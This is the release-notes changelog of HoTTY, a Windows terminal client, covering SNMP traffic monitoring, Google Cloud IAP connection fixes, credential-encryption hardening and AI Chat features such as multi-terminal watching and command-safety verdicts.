- **What you type is saved exactly as typed.** Terminal output that HoTTY sends to the AI is redacted first, but text you write yourself is not — so avoid typing credentials into the chat. The help text now says so.

## v2.0.14-beta3

**A new Interface Traffic pane watches live SNMP counters on your network gear, and the Log Viewer finally has a proper search box.** Point the pane at a switch or router over SNMP v2c or v3 and it lists every interface, then refreshes bps, pps, errors and discards on each poll — no separate monitoring tool to open alongside your terminals. In the Log Viewer, `Ctrl+F` now opens an in-pane search with regular expressions, case matching, and jump-to-match navigation.

### New Features

- **Interface Traffic pane (SNMP).** A new utility pane that polls a network device's interface table and shows live per-interface throughput. **List interfaces** tests the connection and discovers what the device has; **Start** then begins polling and fills in **In/Out bps**, **In/Out pps**, **errors** and **discards** alongside each interface's name, description, status and speed. Rates appear from the second poll onward — the first one establishes the baseline. Sort by any column, filter by name or description, and tick **Up only** to hide interfaces that are down. Enable it under **Settings → Features**; it is on by default.
- **SNMP v2c and v3.** v2c takes a community string; v3 supports all three security levels — **noAuthNoPriv**, **authNoPriv** and **authPriv** — with MD5/SHA authentication and DES/AES privacy, plus an optional context name. The pane warns you inline when noAuthNoPriv is selected, since that sends everything unauthenticated and in the clear.
- **64-bit counters, with a warning when the device has none.** Where the device offers `ifXTable`, HoTTY reads the 64-bit counters. Older agents that only expose the 32-bit ones still work, but the pane shows a **32-bit counters** badge explaining that those wrap in roughly 34 seconds on a saturated 1 Gbps link.
- **Search in the Log Viewer.** `Ctrl+F` opens a search box over the open log file. Move between hits with `Enter` and `Shift+Enter`, watch a live match count, and switch on **Match case**, **Use regular expression**, or **Matching lines only** to collapse the view down to just the lines that hit. An invalid regular expression is reported inline instead of silently finding nothing.

### Improvements

- **Poll interval adjustable without reconnecting.** Changing the interval retunes a running watcher in place, so you can go coarser or finer without dropping the SNMP session and losing your rate baseline.
- **Connection settings remembered per pane.** Each Interface Traffic pane keeps its own device settings. Tick **Remember these connection settings** to keep the credentials too; leave it off and they are asked for each time.
- **Live watcher status.** The pane reports whether it is running or stopped, the current interval, the actual poll time in milliseconds, the device's uptime, and a **Stale** indicator when replies stop arriving.
- **`tauri dev` no longer reloads the app on every Rust rebuild.** Vite was watching `src-tauri/target/`, which cargo rewrites constantly, so each backend rebuild triggered a full page reload that wiped every open feature pane. Development-only — the shipped app is unaffected.
- **Shared timestamp formatting.** The civil-date math the Ping Monitor carried privately moved into one place that both it and the new pane use, removing a duplicated copy rather than adding a third.

### Security

- **SNMP credentials are encrypted with Windows DPAPI.** Community strings and v3 authentication and privacy passwords are encrypted before being stored, and only when you asked for them to be remembered. They are also registered with the log redaction filter, so they cannot surface in a debug log.

## v2.0.14-beta2

**Text Editor and File Explorer are gone, and the encryption behind your saved credentials got a substantial hardening pass.** Those two panes were used so rarely that they never received the attention the others did, so removing them leaves five focused utility panes and a smaller, lighter app. Alongside that, the Windows DPAPI layer that protects your saved usernames, passwords and key passphrases no longer accepts anything it did not encrypt itself.

### Removed

- **Text Editor and File Explorer panes.** Both are removed completely — from the tab bar's feature menu, from **Settings → Features**, and from Help. Five utility panes remain: **Log Viewer**, **Ping Monitor**, **AI Chat**, **File Server**, and **Web Browser**. If you had either one enabled, the leftover setting is tidied up automatically the first time you start this version — nothing to do on your side. Roughly 3,000 lines of code and one npm dependency went with them, so both the installer and the running app are a little lighter.

### Security

- **Saved credentials can no longer be used to decrypt another application's secrets.** HoTTY encrypts credentials with Windows DPAPI plus an app-specific binding, so a blob produced by some other program cannot be opened through HoTTY. Until now the decrypt path quietly retried *without* that binding whenever the first attempt failed, which undid the guarantee it was there to provide. That retry is gone from the path the app uses; it survives only where HoTTY reads back its own files.
- **Credentials written by pre-2.0 builds are upgraded in place.** Anything still in the older format is re-encrypted with the current binding the first time your host tree loads — including **SSH key passphrases**, which the previous migration silently skipped. The plaintext never leaves the process.
- **One unreadable credential no longer blanks the rest.** Decrypting the host tree used to be all-or-nothing: a single damaged entry emptied every other username and password in the list. A failure is now contained to the one field, which is left empty so you know to re-enter it.
- **A saved credential can never be silently replaced with a blank.** A failed decryption could previously be written back over the real value during the host tree's automatic upgrade pass, destroying it for good. The original encrypted value is now always kept.
- **The log folder can no longer be a network path.** A UNC path such as `\\server\share` is rejected before anything touches the disk, so Windows can never be steered into authenticating against a remote share while logging is being set up.

### Improvements

- **Snappier pane highlight.** The flash that marks the newly focused pane when you move with `Ctrl+Tab` is now half as long.
- **Disabled AI Chat buttons stop looking clickable.** Header buttons that are currently unavailable no longer light up on hover.

## v2.0.14-beta1

**AI Chat conversations are now saved to disk, the same way terminal sessions already were.** Turn on **Settings → General → Logging** and every AI Chat conversation is written to a Markdown file in the same folder as your session logs — and shows up in the Log Viewer right next to them. Nothing else to configure: same checkbox, same folder, same folder-approval prompt.

### New Features

- **AI chat transcripts saved as Markdown.** While logging is on, each conversation is appended live to `YYYYMMDDHHMMSS-AICHAT-(Chat).md` in your log folder. The file opens with the model, AI provider, and the terminals the tab was watching, then records every turn with a timestamp. Your messages are written inside a code block so pasted terminal output can't mangle the formatting; the AI's replies stay as plain Markdown, so headings, lists, and code blocks read exactly as they do in the pane. Each turn lands on disk the moment it appears, so nothing is lost if the app is closed or killed mid-conversation.
- **AI chat logs in the Log Viewer.** The Log Viewer now lists `.md` files alongside `.txt` and `.log` ones, sorted together by time, so a chat and the session it was about sit side by side. Type `AICHAT` in the filter box to see just the conversations.
- **A new file per conversation.** Starting a new chat, closing a tab, or switching AI provider closes the current transcript and begins a fresh one on the next message — the same way reconnecting a terminal starts a new session log. The filename records the tab's name at the moment the file is created.

### Improvements

- **Clearer log folder help text.** The hint under **Log Folder Path** now describes both file types you will find there.
- **New help section for AI chat logs.** **Help → Session Logging & Log Viewer** explains where transcripts go, what starts a new file, and that attached images are noted but not saved.

### Security

- **AI chat transcripts obey the same folder approval as session logs.** A transcript can only be written to a folder you approved through the native picker or confirm dialog; the check runs before anything touches the disk, and an unapproved path creates no file or directory. Chat tab names are sanitized before use in a filename, so a name can never steer the file out of the approved folder.
- **Image attachments are recorded, not stored.** Only the image type and size are written to the transcript — the image data itself never leaves the app, which also keeps transcripts small enough for the Log Viewer to open.
- **Logging failures are surfaced, never silent.** If a write fails, HoTTY tells you once and stops logging that conversation instead of quietly saving an incomplete transcript. Changing the log folder re-enables it.
- **What you type is saved exactly as typed.** Terminal output that HoTTY sends to the AI is redacted first, but text you write yourself is not — so avoid typing credentials into the chat. The help text now says so.

## v2.0.13

**Google Cloud IAP connections work end-to-end again, the New Connection dialog now waits with you instead of dropping you into an empty pane, and AI Chat's command verdicts got a quieter, expandable design.** IAP logins had been failing with `Permission denied (publickey)` since v2.0.3-beta4 — HoTTY now asks gcloud which account and key to use, enrolls your SSH key automatically on a fresh PC, and handles corporate Windows logins that are all digits. IAP sessions also verify the VM's host key now, instead of skipping the check entirely.

### New Features

- **Optional SSH user for GCP.** The GCP tab has a new **SSH user** box. Leave it blank — the normal case — and HoTTY detects the account automatically; fill it in for a VM that accepts a different one. A username saved on an IAP host entry takes priority over it.
- **One-click gcloud re-login in the GCP tab.** Whether your credentials expired or you were never signed in, the GCP tab now shows a **Run gcloud auth login** button that launches the Google sign-in in your browser — no need to open a terminal yourself. Finish signing in, then click ↻ to load your projects.

### Improvements

- **In-dialog connection progress.** Connecting from the New Session dialog now keeps the dialog open with a "Connecting…" indicator and a **Cancel** button, and the terminal pane appears only once the session actually connects — so a failed or cancelled attempt never leaves a dead tab in the grid. If it fails, the plain-English reason (authentication failed, host not found, …) is shown inline and your form is preserved so you can adjust and retry immediately. **Esc** or **✕** cancels an attempt in progress.
- **Live step-by-step progress for GCP/IAP.** The IAP pre-flight can take 30–45 seconds — resolving your SSH account, registering the key the first time, starting the tunnel, then authenticating. The dialog now shows which step it is on, on every tab (Hosts / GCP / Web), instead of a single spinner that looked frozen.
- **Confirm before stopping a GCP VM.** Stopping an instance from the GCP tab now asks first, naming the VM in the prompt, so a stray click can't stop the wrong machine. Starting a VM is unchanged.
- **Connecting over IAP is faster.** Working out the login account took three separate gcloud calls; it now takes one, cutting several seconds off every IAP connection.
- **More reliable SSH-account detection for IAP.** HoTTY now scans every line of gcloud's dry-run output rather than only the first match, and falls back to a username derived from your active gcloud account email — so it picks the right account across more VM configurations and gcloud versions.
- **Failed IAP logins say why.** When ssh exits with an error, HoTTY records what ssh actually said in the log (previously only a byte count was kept), along with the account it used and how that account was chosen, and shows a plain-language explanation for a rejected key.
- **AI Chat command verdicts are quieter and expandable.** Each execute block now carries a single colour-coded verdict line — Safe · whitelisted, Safe · AI, Check · AI, Blocked, or Needs confirmation — with a matching tone bar down the side of the block. Click the line to expand the full reason. A routine safe run no longer fills the transcript with justification text, and an AI verdict now distinguishes "will auto-run" from "needs your eyes" instead of showing one label for both.
- **AI Chat: "New chat" is now "Clear Conversation".** That header button clears the conversation you are already in — it never created a tab. It is now labelled for what it does, so it is no longer confused with the **+** in the tab strip that starts a new conversation.

### Bug Fixes

- **IAP login no longer fails with `Permission denied (publickey)`.** HoTTY was picking the OS Login account name (e.g. `alice_example_com`) for VMs that do not use OS Login at all, so the account simply did not exist on the machine. It now asks `gcloud compute ssh` which account and key it would use, and falls back to reading the instance metadata, the project metadata, and the effective `compute.requireOsLogin` org policy — in that order — only using a local username when all of them say OS Login is off. Regression introduced in v2.0.3-beta4.
- **IAP connect works when your Windows login is all digits.** On a corporate PC whose Windows/AD account is a bare number (e.g. `12345678`), the login could never succeed: the guest agent on the VM creates SSH accounts with `useradd`, which refuses usernames starting with a digit — so even `gcloud compute ssh` itself fails the same way. HoTTY now connects under the letter-leading username derived from your gcloud account email, which the VM can actually provision.
- **First IAP connection on a fresh PC no longer fails with `Permission denied (publickey)`.** For VMs that don't use OS Login, HoTTY relies on an SSH key stored in the VM/project metadata — but on a machine whose key had never been registered, that key was missing. HoTTY now enrolls your public key into the instance (or project) metadata automatically on the first connect, using your own gcloud credentials, so IAP works immediately on a new PC without running `gcloud compute ssh … --tunnel-through-iap` by hand first.
- **An expired or wrong-user SSH key is re-enrolled instead of skipped.** The "is my key already in the VM metadata?" check matched on the key contents alone, so it skipped enrollment when the only key present was expired or registered under a different username — leaving you with `Permission denied (publickey)`. It now requires a non-expired key bound to the exact account being used, and registers a fresh one otherwise.
- **IAP no longer offers ssh a PuTTY-format key.** On Windows with PuTTY installed, gcloud reports a `.ppk` key file, which OpenSSH cannot read — producing the same `Permission denied (publickey)` even once the account name was right. HoTTY now keeps the OpenSSH key.
- **Your SSH key is registered with OS Login every time it is needed.** Registration previously ran only on the one connection where HoTTY had to generate a new key, so any machine with an existing `~/.ssh/google_compute_engine` never registered it and failed on OS Login-enabled projects. Present since v2.0.1.
- **VM start/stop status survives closing the New Connection dialog.** Starting or stopping a VM from the GCP tab used to lose track of it the moment the dialog closed or you switched to the Hosts tab — reopening showed the old status and a ▶ Start button for an already-running VM. The whole start/stop lifecycle now runs in the background, so the status is kept, saved to disk, and shown live in every window.
- **"No projects found" no longer hides an expired login.** When gcloud showed an active account but its token could no longer be refreshed, the GCP tab listed zero projects with no explanation — it looked like you were signed in but simply had none. HoTTY now detects the failed token refresh and shows **"Your gcloud credentials have expired."** with guidance to re-authenticate. A genuinely empty account still shows the plain "No projects found." message.

### Security

- **IAP sessions now verify the VM's host key.** The SSH client used for IAP tunnels was started with `StrictHostKeyChecking=no`, which disabled host-key checking outright and contradicted HoTTY's own rule that known_hosts verification is never turned off. It now uses trust-on-first-use (`accept-new`) against the same app-scoped `known_hosts` file the regular SSH protocol path uses, with the key pinned to the instance name rather than the tunnel's ephemeral `127.0.0.1` port. A host key recorded over IAP is therefore recognised on a direct SSH connection and vice versa, and a key that later changes is refused loudly.
- **Reduced the app's Tauri permission set.** Five capabilities the app no longer exercises — window resize, window focus, the native menu API, the JavaScript URL-opener allowlist, and the plugin log API — have been removed from the webview's grant list. External links already go through a backend-vetted allowlist with a confirmation prompt, so the browser-side opener permission was redundant.

## v2.0.13-beta6

**Fixes Google Cloud IAP on corporate PCs whose Windows login is all-numeric — this time for real.** beta5 made HoTTY connect under the numeric account gcloud reports (e.g. `12345678`), but a Linux VM can't create a login that starts with a digit, so the VM refused it. HoTTY now connects under the letter-leading name derived from your gcloud account email, which the VM can actually provision, and it enrolls a fresh SSH key whenever the one in the VM's metadata is missing, expired, or registered under a different name.

### Bug Fixes

- **IAP connect works on VMs where your Windows login is all-numeric.** The guest agent on the VM creates SSH accounts with `useradd`, which refuses usernames starting with a digit — so connecting as `12345678` could never succeed (even `gcloud compute ssh` itself fails the same way). HoTTY now prefers the letter-leading username derived from your gcloud account email, which the VM can create.
- **HoTTY re-enrolls an expired or wrong-user SSH key instead of skipping it.** The "is my key already in the VM metadata?" check previously matched on the key contents alone, so it skipped enrollment when the only key present was expired or registered under a different username — leaving you with `Permission denied (publickey)`. It now requires a non-expired key bound to the exact account being used, and registers a fresh one otherwise.

## v2.0.13-beta5

**Fixes the Google Cloud IAP `Permission denied (publickey)` that still hit corporate PCs whose Windows login is all-numeric.** On machines where the Windows/AD account is a bare number (e.g. `12345678`), HoTTY was rejecting that name as an SSH username *because it starts with a digit*, then falling back to a different, email-derived name that the VM had no key for. HoTTY now accepts digit-leading usernames, so it connects as exactly the account gcloud itself uses — which is what the VM's metadata SSH key is registered under.

### Bug Fixes

- **IAP connect no longer fails with `Permission denied (publickey)` when the Windows login is all-numeric.** gcloud reports the SSH account it will use (e.g. `12345678`) in its `--dry-run` output, but HoTTY discarded any username starting with a digit and substituted a name derived from your gcloud email — which the VM's metadata key isn't bound to, so the login was rejected. Digit-leading POSIX usernames are now valid, so HoTTY uses gcloud's own account name and matches the enrolled key. (The allowed character set is unchanged — a leading `-` is still rejected — so SSH-username injection safety is unaffected.)

## v2.0.13-beta4

**Google Cloud IAP now connects on a brand-new PC without any manual setup — and shows you what it's doing while it works.** The first IAP connection from a machine that had never registered an SSH key used to fail with `Permission denied (publickey)`; HoTTY now enrolls the key into the VM (or project) metadata for you automatically on the first connect. While the ~30–45 second pre-flight runs, the New Session dialog shows a live, step-by-step indicator (Detecting SSH account → Registering SSH key → Starting IAP tunnel → Authenticating) on every tab, so the spinner no longer looks frozen.

### Bug Fixes

- **First IAP connection on a fresh PC no longer fails with `Permission denied (publickey)`.** For VMs that don't use OS Login, HoTTY relies on an SSH key stored in the VM/project metadata — but on a machine whose key had never been registered, that key was missing and the login was rejected. HoTTY now enrolls your public key into the instance (or project) metadata automatically on the first connect (using your own gcloud credentials), so IAP connections work immediately on a new PC without having to run `gcloud compute ssh … --tunnel-through-iap` by hand first.

### Improvements

- **Live connect progress in the New Session dialog.** The GCP/IAP pre-flight can take 30–45 seconds — resolving your SSH account, registering the key the first time, starting the IAP tunnel, then authenticating. The dialog now shows which step it's on, with a **Cancel** button, on every tab (Hosts / GCP / Web), instead of a single spinner that looked stuck.
- **More reliable SSH-account detection for IAP.** When working out the Linux login account and port, HoTTY now scans every line of gcloud's dry-run output rather than only the first match, and falls back to a username derived from your active gcloud account email — so it picks the right account automatically across more VM configurations and gcloud versions.

## v2.0.13-beta3

**The GCP tab now tells you when your Google sign-in has expired — instead of just showing "No projects found."** If gcloud's saved credentials can no longer be refreshed (common on corporate accounts where the login expires or is revoked), the New Session → GCP tab now says so clearly and gives you a one-click **Run gcloud auth login** button to sign in again, rather than silently showing an empty project list.

### Bug Fixes

- **"No projects found" no longer hides an expired login.** When gcloud showed an active account but its token could no longer be refreshed, the GCP tab listed zero projects with no explanation — it looked like you were signed in but simply had none. HoTTY now detects the failed token refresh and shows **"Your gcloud credentials have expired."** with guidance to re-authenticate, so the real cause is obvious instead of misleading.

### Improvements

- **One-click re-login in the GCP tab.** Both when your credentials have expired and when you were never signed in, the GCP tab now shows a **Run gcloud auth login** button that launches the Google sign-in in your browser — no need to open a terminal yourself. Finish signing in, then click ↻ to load your projects. A genuine empty account still shows the plain "No projects found." message, and a non-credential refresh failure now explains why instead of showing an empty list.

## v2.0.13-beta2

**The New Connection dialog now waits with you.** Starting a connection keeps the dialog open with a Connecting indicator instead of dropping you straight into an empty pane — and if it fails, the reason is shown right there so you can fix the details and retry (or Cancel) without losing what you typed. The terminal opens only once the session is actually connected.

### Improvements

- **In-dialog connection progress.** When you connect from the New Session dialog, it now stays open showing a "Connecting…" indicator with a **Cancel** button, and the terminal pane appears only once the session reaches connected — a failed or cancelled attempt never leaves a dead tab in the grid. If the connection fails, the plain-English reason (e.g. authentication failed, host not found) is shown inline and your form is preserved so you can adjust and retry immediately. **Esc** or the **✕** button cancels an in-progress attempt and returns you to the editable form.
- **Confirm before stopping a GCP VM.** Stopping an instance from the GCP tab now asks for confirmation first, naming the VM in the prompt, so a stray click can't stop the wrong machine. Starting a VM is unchanged.
- **AI Chat image-attach button moved.** The image-attach (paperclip) button now sits to the right of the model button in the AI Chat input, grouping it with the other send-row controls.

## v2.0.13-beta1

**Google Cloud IAP connections are fixed and more reliable.** Logging in to a VM over IAP had been failing with `Permission denied (publickey)` since v2.0.3-beta4 because HoTTY guessed the wrong Linux account; it now asks gcloud directly. VM start/stop status is also no longer lost when you close the New Connection dialog, and connecting is noticeably faster.

### Bug Fixes

- **IAP login no longer fails with "Permission denied (publickey)".** HoTTY was picking the OS Login account name (e.g. `you_example_com`) for VMs that do not use OS Login at all, so the account simply did not exist on the machine. It now asks `gcloud compute ssh` which account and key it would use, and falls back to reading the instance metadata, the project metadata, and the effective `compute.requireOsLogin` org policy — in that order — only using a local username when all of them say OS Login is off. Regression introduced in v2.0.3-beta4.
- **IAP no longer offers ssh a PuTTY-format key.** On Windows with PuTTY installed, gcloud reports a `.ppk` key file, which OpenSSH cannot read — producing the same `Permission denied (publickey)` even once the account name was right. HoTTY now keeps the OpenSSH key.
- **Your SSH key is registered with OS Login every time it is needed.** Registration previously ran only on the one connection where HoTTY had to generate a new key, so any machine with an existing `~/.ssh/google_compute_engine` never registered it and failed on OS Login-enabled projects. Present since v2.0.1.
- **VM start/stop status survives closing the New Connection dialog.** Starting or stopping a VM from the GCP tab used to lose track of it the moment the dialog closed or you switched to the Hosts tab — reopening showed the old status and a ▶ Start button for an already-running VM. The whole start/stop lifecycle now runs in the background, so the status is kept, saved to disk, and shown live in every window.

### Improvements

- **Connecting over IAP is faster.** Working out the login account took three separate gcloud calls; it now takes one, cutting several seconds off every IAP connection.
- **Optional SSH user for GCP.** The GCP tab has a new **SSH user** box. Leave it blank — the normal case — and HoTTY detects the account automatically; fill it in for a VM that accepts a different one. A username saved on an IAP host entry takes priority over it.
- **Failed IAP logins say why.** When ssh exits with an error, HoTTY now records what ssh actually said in the log (previously only a byte count was kept) along with the account it used and how that account was chosen, and shows a plain-language explanation for a rejected key.

## v2.0.12

**AI Chat** grows from watching a single terminal to watching many: one conversation can now monitor several terminals at once — colour-coded, with each suggested command routed to the right one — plus you can attach images and keep typing while the AI is still replying.

### New Features

- **Watch several terminals in one AI Chat.** An AI Chat conversation can now watch multiple terminals at the same time and reason across all of them at once — ideal for a problem that spans, say, a web server and a database. Turn on **AI Watch** on a terminal to add it to your active conversation, or use the **+** beside the terminal chips in the AI Chat header to add any open terminal (including one running in another window). Each watched terminal appears as a chip — click it to jump there, or its **×** to stop watching; a disconnected terminal greys out and re-links itself when it reconnects. Every watched terminal's recent output is included (labelled per terminal) when you send a message. Turning on **AI Watch** now grows your active conversation instead of opening a new tab per terminal; use **+ New chat** for a fresh, independent conversation with its own set of terminals.
- **Commands run on the right terminal automatically.** When several terminals are watched and the AI suggests a command, it is routed to the terminal the AI intends — you still confirm before it runs (and see which terminal it will target), but you never have to pick the destination. Each run targets exactly one terminal. With a single watched terminal, nothing changes.
- **Choose which conversation watches a terminal.** With two or more AI Chat conversations open, clicking a terminal's **AI Watch** button opens a small picker so you choose which conversation watches it — or start a new one. A terminal belongs to one conversation at a time: choosing a different conversation moves it there, and choosing its current one stops watching. With a single conversation, **AI Watch** stays one click as before.
- **Attach images to AI Chat.** Include images in a message to the AI — paste straight from the clipboard (Ctrl + V), drag image files onto the message box, or click the paperclip button to pick files. Attached images appear as thumbnails you can remove before sending, then inline in the conversation once sent. Supported on vision-capable models across Gemini, Vertex AI, OpenAI and Anthropic; PNG, JPEG, WebP and GIF are accepted (up to 5 images per message, 5 MB each). Each image is kept in that conversation's history, so you can ask follow-up questions about it.
- **Parallel AI Chat replies.** Multiple AI Chat conversation tabs in one pane can now stream their replies at the same time instead of strictly one at a time; extra sends queue and start as slots free up. Set the limit in **Settings → AI → Parallel AI Chat replies** (default 3, range 1–8; set it to 1 to keep the old one-at-a-time behaviour, e.g. if your provider rate-limits like the Gemini free tier).

### Improvements

- **Colour-coded conversations.** Each AI Chat conversation now has its own colour. Every terminal it watches lights its **AI Watch** button and tab underline in that colour, and the conversation's tab and header chips share the same colour — so you can tell at a glance which conversation is watching which terminals. The colours are editable in the Custom Theme editor.
- **Type and send during an AI response.** The AI Chat input is no longer disabled while a reply is streaming. A message you send mid-response is queued and handed to the model as its next turn the moment the current reply finishes — ahead of any automatic follow-ups (such as auto-run command output), so your message is what the AI considers next. A small "queued" indicator appears while a message waits, and multiple queued messages are sent in the order you typed them.
- **Network Expert preps every watched device.** When an AI Chat using the **Network Expert** persona watches several terminals, its start-of-session protocol — identify the device, then disable paging — now runs on each watched device in turn, with each command routed to the correct terminal, and a reconnected device re-disables paging on its own terminal.
- **Clearer disconnect messages.** When a connection drops mid-session (Serial, WSL, Local, Telnet, or IAP), HoTTY now shows a plain "Connection reset" / "Connection lost" message instead of a raw read error with an OS error code.

## v2.0.12-beta5

AI Chat now color-codes each conversation and lets you choose which one watches a terminal — and every watched terminal lights up, not just one.

### New Features

- **Choose which conversation watches a terminal.** When you have two or more AI Chat conversations open, clicking a terminal's **AI Watch** button now opens a small picker so you pick which conversation should watch it — or start a new conversation — instead of it silently joining whichever chat happened to be active. A terminal belongs to one conversation at a time: choosing a different conversation moves it there, and choosing its current one stops watching. With a single conversation, **AI Watch** stays one click as before.

### Improvements

- **Color-coded conversations.** Each AI Chat conversation now has its own color. Every terminal it watches lights its **AI Watch** button and tab underline in that color, and the conversation's tab and its header chips share the same color — so you can tell at a glance which conversation is watching which terminals. The colors are editable in the Custom Theme editor.

### Bug Fixes

- **Every watched terminal now lights up.** When one conversation watched several terminals, only a single terminal's **AI Watch** button turned green; now every watched terminal is highlighted, each in its conversation's color.

## v2.0.12-beta4

Fixes the Network Expert persona so it identifies every terminal a chat watches, not just the first.

### Bug Fixes

- **Network Expert now preps every watched terminal.** When an AI Chat using the **Network Expert** persona watches several terminals, the start-of-session protocol (identify the device, then disable paging) now runs on each watched device in turn, with each command routed to the correct terminal — previously only the first terminal was identified. Adding another terminal to the conversation no longer risks clearing the existing chat, and a reconnected device re-disables paging on its own terminal.

## v2.0.12-beta3

One AI Chat conversation can now watch several terminals at once, and AI-suggested commands are routed to the right terminal automatically.

### New Features

- **Watch several terminals in one AI Chat.** An AI Chat tab can now watch multiple terminals at the same time, so the AI reasons across all of them at once — ideal for a problem that spans, say, a web server and a database. Turn on **AI Watch** on a terminal to add it to your active conversation, or use the **+** beside the terminal chips in the AI Chat header to add any open terminal (including one running in another window). Each watched terminal appears as a chip — click it to jump to that terminal, or its **×** to stop watching it; a disconnected terminal greys out and re-links itself automatically when it reconnects. When you send a message, the recent output of every watched terminal is included, labelled per terminal. Start a separate conversation with its own set of terminals using **+ New chat** in the tab strip.
- **Commands run on the right terminal automatically.** When several terminals are watched and the AI suggests a command, it is routed to the terminal the AI intends — you still confirm before it runs (and see which terminal it will run on), but you never have to choose the destination yourself. Each run still targets exactly one terminal; ask again to act on another. With a single watched terminal, nothing changes.

### Improvements

- **AI Watch now builds one conversation instead of one tab per terminal.** Turning on **AI Watch** on another terminal adds it to the terminals your active chat is already watching, rather than opening a separate tab each time. Use **+ New chat** when you want a fresh, independent conversation.

## v2.0.12-beta2

Send images to the AI in AI Chat — paste a screenshot, drop an image file, or attach one with the new button.

### New Features

- **Attach images to AI Chat.** You can now include images in a message to the AI. Paste an image straight from the clipboard (Ctrl + V), drag image files onto the message box, or click the new paperclip button to pick files. Attached images appear as thumbnails you can remove before sending, and are shown inline in the conversation once sent. Supported on vision-capable models across Gemini, Vertex AI, OpenAI and Anthropic; PNG, JPEG, WebP and GIF are accepted (up to 5 images per message, 5 MB each). Each image is kept in that conversation's history, so you can ask follow-up questions about it.

## v2.0.12-beta1

AI Chat no longer locks the message box while a reply is streaming — you can type and send your next message right away.

### Improvements

- **Type and send during an AI response.** The AI Chat input is no longer disabled while a reply is streaming. A message you send mid-response is queued and then handed to the model as its next turn the moment the current reply finishes — ahead of any automatic follow-ups (such as auto-run command output), so your message is what the AI considers next. A small "queued" indicator appears while a message is waiting, and multiple queued messages are sent in the order you typed them.

## v2.0.11

A major **AI Chat** release: parallel conversations that no longer block each other, safer command review with a cancellable auto-run countdown, reworked terminal linking, per-tab token accounting, and clearer errors — plus accessibility and naming polish.

### New Features

- **Auto-run countdown.** In *auto-execute-safe* mode, a command the safety classifier judges safe now waits out a short, cancellable countdown before it runs, so you can stop it first. Set the grace period in **Settings → AI → Auto-run countdown** (default 3 seconds, range 0–10; 0 runs immediately). A **Cancel** button appears during the countdown, and pausing auto-execution — or leaving auto-execute-safe mode — stops any pending countdowns.

### Improvements

- **Concurrent AI Chat.** A response streaming in one tab no longer blocks every other AI action — a second tab's send, the model-list fetch, command-safety checks, even **New Chat**. Conversations and background safety classification now run in parallel, and **Stop**, provider switch and logout take effect immediately instead of queuing behind the stream.
- **Change the model, persona or response language mid-response.** These selectors are no longer locked while a reply streams; they apply to your next message. (The Vertex AI region selector stays locked during a stream — changing it reloads the model list and cancels the response.)
- **Safety verdicts now appear in "Ask before execute" mode, not just auto mode.** A blacklisted command is flagged with a 🛑 badge and a whitelisted one with a ✅ badge *before* you press Run. The check is instant and makes no AI call.
- **Reworked chat-tab terminal linking.** The **+** opens a new *unlinked* (general) chat tab instead of inheriting the last-focused terminal. A linked tab shows the terminal name (click to jump to it) plus an explicit **unlink** button; an unlinked tab shows a **"Link a terminal"** picker (this window or another) so you can attach it anytime. Closing the last chat tab closes the AI Chat pane.
- **AI Chat tab strip restyled** to match the main tab bar — colours, the accent-coloured active tab, and the circular × — tabs are always closeable, and the **+** sits immediately to the right of the last tab.
- **Per-tab token & cost accounting.** Token and cost totals are tracked per chat tab; switching tabs shows that tab's running total, and **New chat** resets only the active tab's counter.
- **Clearer AI error messages.** When a request to OpenAI, Anthropic or Gemini fails, the chat names the actual cause — authentication failure, quota / rate limit, model not found, or a provider outage — with a short provider detail, instead of a generic message.
- **"AI Watch" is now the single name for terminal monitoring** across the tab button, right-click menu and tooltips (**Start AI Watch** / **Stop AI Watch**).
- **AI Chat accessibility.** Stop and Send are labelled for screen readers, streaming replies are announced, the input area resizes from the keyboard (focus the divider, then ↑/↓), and every reply has a copy button.
- **The AI Chat message icon reflects the active provider's brand colour** instead of always showing the Gemini gradient.
- **Smarter empty state and a settings shortcut** — starter suggestions no longer assume terminal output exists when nothing is linked, and the execution-mode popover gains a **More safety settings…** link to Settings → AI.
- **More of the AI Chat is translated** — cancellation, stream-timeout and error text, and tab labels now follow your UI language.

### Performance

- **AI conversation history is now bounded per tab**, so a very long chat can't grow HoTTY's memory without limit.

### Bug Fixes

- **AI model-list load failures are no longer masked.** When the model list can't be fetched (expired sign-in, network error, server rejection), AI Chat surfaces the retry + error banner instead of silently showing a hardcoded fallback list.
- **Fixed a stale "select a model" hint** that pointed to a dropdown that no longer exists; it now points to the AI settings button below the message box.
- **AI command-safety checks no longer stall behind a long reply** — the classification that gates auto-execution has its own timeout.
- **A stalled AI response can no longer wedge the AI features** — a backstop timeout releases a hung stream so other AI actions keep working.

## v2.0.11-beta3

Polishes **AI Chat** tabs and terminal linking, adds a cancellable countdown before a command auto-runs, and makes model-list load failures visible instead of masked.

### New Features

- **Auto-run countdown.** In *auto-execute-safe* mode, a command the safety classifier judges safe now waits out a short, cancellable countdown before it runs, so you can stop it first. Set the grace period in **Settings → AI → Auto-run countdown** (default 3 seconds, range 0–10; 0 runs immediately as before). A **Cancel** button appears on the command during the countdown, and pausing auto-execution — or switching out of auto-execute-safe mode — stops any pending countdowns.

### Improvements

- **Reworked chat-tab terminal linking.** The **+** now opens a new *unlinked* (general) chat tab instead of silently inheriting the last-focused terminal. A linked tab shows a single control — the terminal name (click to jump to it) plus an explicit **unlink** button — instead of a name chip next to a duplicate picker. An unlinked tab shows a **"Link a terminal"** picker (this window or another) so you can attach it at any time. Closing the last remaining chat tab now closes the whole AI Chat pane.
- **AI Chat tab strip restyled** to match the main tab bar — colours, the accent-coloured active tab, and the circular × close — tabs are always closeable, and the **+** sits immediately to the right of the last tab.
- **Per-tab token & cost accounting.** Token and cost totals are now tracked per chat tab: switching tabs shows that tab's running total, and **New chat** resets only the active tab's counter instead of the whole pane's.

### Bug Fixes

- **AI model-list load failures are no longer masked.** When the model list can't be fetched (expired sign-in, network error, server rejection), AI Chat now surfaces the retry + error banner instead of silently showing a hardcoded fallback list — which could otherwise leave you picking a model that then fails to send.

## v2.0.11-beta2

Makes **AI Chat** concurrent: a streaming response no longer blocks everything else, and you can change the model, persona or language mid-response.

### Improvements

- **AI Chat no longer serializes across tabs.** A response streaming in one tab used to block every other AI action — a second tab's send, the model-list fetch, command-safety checks, even **New Chat** — until it finished. Those now run in parallel, so multiple AI conversations (and background safety classification) proceed concurrently, and **Stop**, provider switch and logout take effect immediately instead of queuing behind the stream.
- **Change the model, persona or response language mid-response.** These selectors in the AI Chat settings were locked while a reply was streaming; they're now editable at any time and apply to your next message. This matters most during the Network-Expert auto-run loop, where the tab streams almost continuously. (The Vertex AI region selector stays locked during a stream — changing it reloads the model list and cancels the response.)

## v2.0.11-beta1

